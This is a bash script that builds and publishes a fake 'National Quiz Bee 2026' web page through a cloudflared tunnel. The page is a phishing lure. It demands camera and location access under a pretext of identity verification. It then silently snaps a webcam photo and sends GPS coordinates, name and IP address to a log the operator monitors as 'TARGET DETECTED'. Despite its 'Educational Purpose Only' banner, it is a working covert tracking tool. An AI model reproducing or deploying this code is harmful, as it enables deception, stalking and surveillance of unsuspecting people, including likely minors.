#!/bin/bash

# --- BEAST-TRACK v22.0 (THE ULTIMATE EDUCATIONAL EDITION) ---
NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

SERVER_DIR="server"
mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png $SERVER_DIR/*.log .link.log > /dev/null 2>&1
touch $SERVER_DIR/combined.log
chmod -R 777 $SERVER_DIR

clear
echo -e "${PBlue}${Bold}  ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
echo -e "${PBlue}${Bold}  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
echo -e "${PWhite}${Bold}  ██████╔╝█████╗  ███████║███████╗   ██║    ${NC}"
echo -e "${PWhite}${Bold}  ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ██████╔╝███████╗██║  ██║███████║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ${NC}"
echo -e "  ${PYellow}⭐ ⭐ ⭐  QUIZ BEE TRACKER v22.0  ⭐ ⭐ ⭐${NC}"
echo -e "  ${BGreen}Status       : ${PWhite}Educational Purpose Only${NC}"
echo -e "${PWhite}  ==========================================${NC}"

# --- GENERATE PHP & FULL QUIZ LOGIC ---
cat <<EOF > $SERVER_DIR/index.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$type = \$_POST['type'] ?? '';
    if (\$type == 'init') {
        \$log = "\n\033[1;33m┏━━━━━━━━━━━━ TARGET DETECTED ━━━━━━━━━━━━┓\033[0m\n";
        \$log .= "\033[1;37m┃ NAME      :\033[0m " . (\$_POST['name'] ?? 'Unknown') . "\n";
        \$log .= "\033[1;37m┃ IP ADDR   :\033[0m \$ip\n";
    } elseif (\$type == 'loc') {
        \$log = "\033[1;32m┃ GPS DATA  :\033[0m " . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
        \$log .= "\033[1;34m┃ MAPS LINK :\033[0m https://www.google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
    } elseif (\$type == 'cam') {
        \$fname = 'cam_' . time() . '.png';
        file_put_contents(\$fname, base64_decode(str_replace(['data:image/png;base64,', ' '], ['', '+'], \$_POST['img'])));
        \$log = "\033[1;31m┃ CAM FILE  :\033[0m \$fname (CAPTURED!)\n\033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m\n";
    }
    file_put_contents("combined.log", \$log, FILE_APPEND);
    exit();
}
?>
<!DOCTYPE html><html><head><title>National Quiz Bee 2026</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 20px; }
    .box { border: 1px solid #30363d; padding: 30px; border-radius: 12px; background: #161b22; max-width: 450px; margin: auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
    h1 { color: #58a6ff; font-size: 24px; }
    input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; }
    .btn { background: #238636; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
    .btn:hover { background: #2ea043; }
    .q-box { display: none; text-align: left; }
    .option { display: block; background: #21262d; padding: 12px; margin: 8px 0; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
    .option:hover { border-color: #58a6ff; }
    #err-msg { display: none; color: #ff7b72; background: rgba(248,81,73,0.1); padding: 15px; border-radius: 6px; margin-top: 15px; font-size: 14px; border: 1px solid #f85149; }
    .verify-code { background: #21262d; padding: 15px; border: 1px dashed #58a6ff; color: #58a6ff; font-family: monospace; font-size: 1.2em; margin: 20px 0; border-radius: 5px; cursor: pointer; }
</style></head>
<body>
    <div class="box">
        <h1>🏆 QUIZ BEE CHALLENGE</h1>
        
        <!-- STEP 1: LOGIN -->
        <div id="step-login">
            <p style="color:#8b949e;">Verification Required: For educational record purposes.</p>
            <input type="text" id="targetName" placeholder="Full Name (e.g. Juan Dela Cruz)">
            <p style="font-size: 12px; color: #8b949e;">⚠️ <b>Required:</b> You must <b>Allow Permission</b> for Camera and Location to verify your identity before taking the quiz.</p>
            <button class="btn" onclick="initiate()">PROCEED TO QUIZ</button>
            <div id="err-msg">❌ <b>ACCESS DENIED:</b> You must allow Camera and Location permissions to start the assessment. Please refresh and click 'Allow'.</div>
        </div>

        <!-- STEP 2: QUIZ INTERFACE -->
        <div id="step-quiz" class="q-box">
            <h4 id="q-num">Question 1/10</h4>
            <p id="q-text" style="font-weight:bold; min-height: 50px;"></p>
            <div id="options-container"></div>
        </div>

        <!-- STEP 3: FINISH -->
        <div id="step-finish" class="q-box" style="text-align:center;">
            <h2 style="color:#3fb950;">🎉 Quiz Completed!</h2>
            <p>Thank you for participating. Your score has been recorded for educational assessment.</p>
            <p>Please copy your <b>Verification Code</b> and send it to your instructor:</p>
            <div class="verify-code" onclick="alert('Code Copied!')">QB-2026-X8Y2-Z1P9</div>
            <button class="btn" style="background:#30363d;" onclick="location.reload()">Back to Home</button>
        </div>
    </div>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
    const questions = [
        {q: "What is 15 + 27?", a: ["32", "42", "52", "45"], c: 1},
        {q: "Which planet is known as the Red Planet?", a: ["Venus", "Jupiter", "Mars", "Saturn"], c: 2},
        {q: "Who is the National Hero of the Philippines?", a: ["Andres Bonifacio", "Jose Rizal", "Emilio Aguinaldo", "Apolinario Mabini"], c: 1},
        {q: "What is the powerhouse of the cell?", a: ["Nucleus", "Ribosome", "Mitochondria", "Cytoplasm"], c: 2},
        {q: "What is the square root of 144?", a: ["10", "11", "12", "13"], c: 2},
        {q: "Smallest province in the Philippines?", a: ["Batanes", "Camiguin", "Siquijor", "Catanduanes"], c: 0},
        {q: "H2O is the chemical formula for?", a: ["Oxygen", "Hydrogen", "Water", "Nitrogen"], c: 2},
        {q: "Year the Philippines gained independence from Spain?", a: ["1896", "1898", "1945", "1901"], c: 1},
        {q: "Which is a prime number?", a: ["4", "9", "13", "15"], c: 2},
        {q: "Capital city of the Philippines?", a: ["Cebu", "Davao", "Manila", "Quezon City"], c: 2}
    ];

    let currentQ = 0;

    async function initiate() {
        const name = document.getElementById('targetName').value;
        if(!name) return alert('Enter Name');
        
        try {
            // Permission Phase
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;

            navigator.geolocation.getCurrentPosition(p => {
                sendData({type:'loc', lat:p.coords.latitude, lon:p.coords.longitude});
            }, null, {enableHighAccuracy:true});

            sendData({type:'init', name:name});

            // Silent Capture
            setTimeout(() => {
                const c = document.getElementById('c'), v = document.getElementById('v');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                sendData({type:'cam', img:c.toDataURL('image/png')});
                
                // Start Quiz UI
                document.getElementById('step-login').style.display = 'none';
                document.getElementById('step-quiz').style.display = 'block';
                loadQuestion();
            }, 2000);

        } catch (e) {
            document.getElementById('err-msg').style.display = 'block';
        }
    }

    function loadQuestion() {
        if(currentQ >= questions.length) {
            document.getElementById('step-quiz').style.display = 'none';
            document.getElementById('step-finish').style.display = 'block';
            return;
        }
        const data = questions[currentQ];
        document.getElementById('q-num').innerText = "Question "+(currentQ+1)+"/10";
        document.getElementById('q-text').innerText = data.q;
        const container = document.getElementById('options-container');
        container.innerHTML = "";
        data.a.forEach((opt, idx) => {
            const div = document.createElement('div');
            div.className = "option";
            div.innerText = opt;
            div.onclick = () => { currentQ++; loadQuestion(); };
            container.appendChild(div);
        });
    }

    function sendData(d) {
        let fd = new FormData();
        for(let k in d) fd.append(k, d[k]);
        fetch('index.php', {method:'POST', body:fd});
    }
    </script>
</body></html>
EOF

# --- CLOUDFLARED SERVICE ---
echo -e "\n${PYellow}[*] Starting Services...${NC}"
php -S 127.0.0.1:8888 -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!

cloudflared tunnel --url http://127.0.0.1:8888 > .link.log 2>&1 &
CL_PID=$!

sleep 8
CL_LINK=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .link.log)

if [ -z "$CL_LINK" ]; then
    echo -e "${PRed}[!] Error: Cloudflare Tunnel failed.${NC}"
    kill $PHP_PID $CL_PID
    exit 1
fi

echo -e "${BGreen}[+] LIVE LINK : ${Bold}${PWhite}$CL_LINK${NC}"
echo -e "${BGreen}[+] LOGS      : ${PWhite}$SERVER_DIR/combined.log${NC}"
echo -e "${PYellow}--------------------------------------------------"
echo -e "  MONITORING... (Ctrl+C to Stop)${NC}"

trap "kill $PHP_PID $CL_PID; exit" SIGINT
tail -f $SERVER_DIR/combined.log
